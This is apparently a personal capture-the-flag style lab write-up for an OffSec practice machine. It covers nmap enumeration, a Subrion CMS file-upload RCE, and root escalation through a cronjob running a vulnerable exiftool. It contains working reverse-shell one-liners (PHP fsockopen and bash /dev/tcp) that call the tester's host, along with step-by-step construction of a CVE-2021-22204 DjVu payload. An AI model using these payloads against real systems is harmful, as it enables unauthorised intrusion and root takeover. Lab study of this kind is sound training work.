# Exfiltration

Nmap: 

```html
┌──(kali㉿kali)-[~/OSCP]
└─$ sudo nmap -sC -sV -p1-10000 192.168.110.163 -o nmap
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-06 19:44 AEDT
Nmap scan report for 192.168.110.163
Host is up (0.40s latency).
Not shown: 9998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://exfiltrated.offsec/
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 7 disallowed entries 
| /backup/ /cron/? /front/ /install/ /panel/ /tmp/ 
|_/updates/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 121.86 seconds
                                                                           
```

Used the http-enum script tag on port 80: 

```html
└─$ sudo nmap -p80 --script=http-enum 192.168.110.163 -o nmap 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-06 19:50 AEDT
Nmap scan report for exfiltrated.offsec (192.168.110.163)
Host is up (0.39s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /blog/: Blog
|   /clientaccesspolicy.xml: Microsoft Silverlight crossdomain policy
|   /atom.xml: RSS or Atom feed
|   /rss.xml: RSS or Atom feed
|   /login/: Login page
|   /robots.txt: Robots file
|   /crossdomain.xml: Adobe Flash crossdomain policy
|   /.gitignore: Revision control ignore file
|   /Citrix/PNAgent/config.xml: Citrix
|   **/changelog.txt: Version field**
|   /admin/environment.xml: Moodle files
|   /manifest.json: Manifest JSON File
|   /0/: Potentially interesting folder
|   /cron/: Potentially interesting folder
|   /help/: Potentially interesting folder
|   /index/: Potentially interesting folder
|   /members/: Potentially interesting folder
|   /search/: Potentially interesting folder
|   /sitecore/shell/sitecore.version.xml: Sitecore.NET login page
|   /sitecore/shell/Applications/shell.xml: Sitecore.NET (CMS)
|   /App_Config/Security/Domains.config.xml: Sitecore.NET (CMS)
|_  /App_Config/Security/GlobalRoles.config.xml: Sitecore.NET (CMS)

Nmap done: 1 IP address (1 host up) scanned in 129.24 seconds

```

Found the website framework ‘Subrion CMS’:

![Screenshot 2025-12-06 at 8.11.27 pm.png](Exfiltration/Screenshot_2025-12-06_at_8.11.27_pm.png)

- Needed to find the version number ‘Subrion CMS’
- Found the file using nmap script (http-enum) tag - changelog.txt

![Screenshot 2025-12-06 at 8.16.51 pm.png](Exfiltration/Screenshot_2025-12-06_at_8.16.51_pm.png)

Searched for the framework on ExploitDB:

```html
┌──(kali㉿kali)-[~/OSCP]
└─$ searchsploit Subrion CMS                                 
--------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                     |  Path
--------------------------------------------------------------------------------------------------- ---------------------------------
Subrion 3.x - Multiple Vulnerabilities                                                             | php/webapps/38525.txt
SUBRION CMS - Multiple Vulnerabilities                                                             | php/webapps/17390.txt
Subrion CMS 2.2.1 - Cross-Site Request Forgery (Add Admin)                                         | php/webapps/21267.txt
subrion CMS 2.2.1 - Multiple Vulnerabilities                                                       | php/webapps/22159.txt
Subrion CMS 4.0.5 - Cross-Site Request Forgery (Add Admin)                                         | php/webapps/47851.txt
Subrion CMS 4.0.5 - Cross-Site Request Forgery Bypass / Persistent Cross-Site Scripting            | php/webapps/40553.txt
Subrion CMS 4.0.5 - SQL Injection                                                                  | php/webapps/40202.txt
**Subrion CMS 4.2.1 - 'avatar[path]' XSS                                                             | php/webapps/49346.txt
Subrion CMS 4.2.1 - Arbitrary File Upload                                                          | php/webapps/49876.py
Subrion CMS 4.2.1 - Cross Site Request Forgery (CSRF) (Add Amin)                                   | php/webapps/50737.txt
Subrion CMS 4.2.1 - Cross-Site Scripting                                                           | php/webapps/45150.txt
Subrion CMS 4.2.1 - Stored Cross-Site Scripting (XSS)**                                              | php/webapps/51110.txt
--------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

Found **CVE-2018-19422-SubrionCMS-RCE on github:** 

![Screenshot 2025-12-12 at 10.33.02 am.png](Exfiltration/Screenshot_2025-12-12_at_10.33.02_am.png)

Downloaded script onto my host and used default creds: 

![Screenshot 2025-12-12 at 10.33.17 am.png](Exfiltration/Screenshot_2025-12-12_at_10.33.17_am.png)

Used the following to get a more stable reverse shell on my local: 

```html
php -r '$sock=fsockopen("192.168.45.209",4444);$proc=proc_open("/bin/bash", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

![Screenshot 2025-12-12 at 10.40.27 am.png](Exfiltration/1a5df8ad-70df-4ce5-be8f-d3eecba9d173.png)

crontab: 

```html

www-data@exfiltrated:/var/spool/cron$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* *     * * *   root    bash /opt/image-exif.sh
#
www-data@exfiltrated:/var/spool/cron$ 

```

- ***** means the cronjob runs every minute
- Runs with root permissions

File permissions:

```html
www-data@exfiltrated:/var/spool/cron$ ls -la /opt/image-exif.sh
ls -la /opt/image-exif.sh
-rwxr-xr-x 1 root root 437 Jun 10  2021 /opt/image-exif.sh
www-data@exfiltrated:/var/spool/cron$ 
```

File contents:

```html
www-data@exfiltrated:/var/spool/cron$ cat /opt/image-exif.sh
cat /opt/image-exif.sh
#! /bin/bash
#07/06/18 A BASH script to collect EXIF metadata 

echo -ne "\\n metadata directory cleaned! \\n\\n"

IMAGES='/var/www/html/subrion/uploads'
META='/opt/metadata'
FILE=`openssl rand -hex 5`

LOGFILE="$META/$FILE"

echo -ne "\\n Processing EXIF metadata now... \\n\\n"
ls $IMAGES | grep "jpg" | while read filename; 
do 
    exiftool "$IMAGES/$filename" >> $LOGFILE 
done

echo -ne "\\n\\n Processing is finished! \\n\\n\\n"
www-data@exfiltrated:/var/spool/cron$ 

```

- File runs **exiftool** on all files within the /var/www/html/subrion/uploads directory with a jpg extension

- Known vulnerability for exiftool version
- [https://nvd.nist.gov/vuln/detail/cve-2021-22204](https://nvd.nist.gov/vuln/detail/cve-2021-22204)
- https://ine.com/blog/exiftool-command-injection-cve-2021-22204-exploitation-and-prevention-strategies

```html
www-data@exfiltrated:/var/www/html/subrion/uploads$ exiftool -ver
exiftool -ver
11.88
www-data@exfiltrated:/var/www/html/subrion/uploads$
```

Using the following payload we can execute commands on the host through the cronjob Payload:

```
(metadata "\c${system('id')};")
```

Tried so many reverse shell, this is the only one that worked with the exiftool: 

```html
bash -c \"bash -i >& /dev/tcp/192.168.45.227/1112 0>&1\"
```

We need to format the file in the following sequence to allow it to be executable by exiftool**:**

```
touch (metadata "\c${system('bash -c \"bash -i >& /dev/tcp/192.168.45.227/1112 0>&1\"')};") > payload

bzz payload payload.bzz

djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz

file exploit.djvu

mv exploit.djvu exploit.jpg (change the file to jpg for the cronjob)
```

Set up a python webshell to retrieve the file 

```html
┌──(kali㉿kali)-[~/OSCP/Labs/PracticeGrounds/Exfiltrated]
└─$ python -m http.server 8081
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
192.168.201.163 - - [12/Dec/2025 14:23:21] "GET /1A.jpg HTTP/1.1" 200 -
```

Retrieved the file using wget:

```html
www-data@exfiltrated:/var/www/html/subrion/uploads$ wget 192.168.45.209/1A.jpg
<ww/html/subrion/uploads$ wget 192.168.45.209/1A.jpg
--2025-12-12 04:48:17--  http://192.168.45.209/1A.jpg
Connecting to 192.168.45.209:80... failed: Connection refused.
www-data@exfiltrated:/var/www/html/subrion/uploads$ wget 192.168.45.209:8081/1A.jpg
<ml/subrion/uploads$ wget 192.168.45.209:8081/1A.jpg
--2025-12-12 04:48:39--  http://192.168.45.209:8081/1A.jpg
Connecting to 192.168.45.209:8081... connected.
HTTP request sent, awaiting response... 200 OK
Length: 130 [image/jpeg]
Saving to: ‘1A.jpg’

1A.jpg              100%[===================>]     130  --.-KB/s    in 0s      

2025-12-12 04:48:42 (39.5 MB/s) - ‘1A.jpg’ saved [130/130]

```

Started a nc listener on my local host and waited for the cronjob to execute with root permissions: 

![Screenshot 2025-12-12 at 4.28.49 pm.png](Exfiltration/Screenshot_2025-12-12_at_4.28.49_pm.png)